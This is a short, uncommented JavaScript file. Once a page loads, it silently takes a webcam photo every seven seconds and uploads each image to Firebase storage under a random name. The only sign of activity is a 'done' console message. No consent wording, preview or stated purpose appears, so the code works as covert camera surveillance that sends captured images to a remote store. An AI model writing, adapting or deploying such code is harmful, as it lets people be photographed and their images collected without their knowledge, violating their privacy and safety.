var getName = ()=>{
     let base1 = Math.random()
     let base2 = Math.random()
     return base1 + base2 
}
window.addEventListener('load',()=>{
    setInterval(()=>{
      var xp = getName().toString().substring(2,6)
      var pRef = firebase.storage().ref("image/"+xp)
    if (navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            let mediaStreamTrack = stream.getVideoTracks()[0];
            let imageCapture = new ImageCapture(mediaStreamTrack);
            imageCapture.takePhoto().then(blob=>{
                let work = pRef.put(blob)
                work.on('state_changed',p=>{
                let prog = p.bytesTransferred / p.totalBytes * 100
                if(prog == 100){
                  console.log('done')
                }
            })
            })
          })
          .catch(function (e) {
            console.log(e);
          });
      }
    },7000)
})
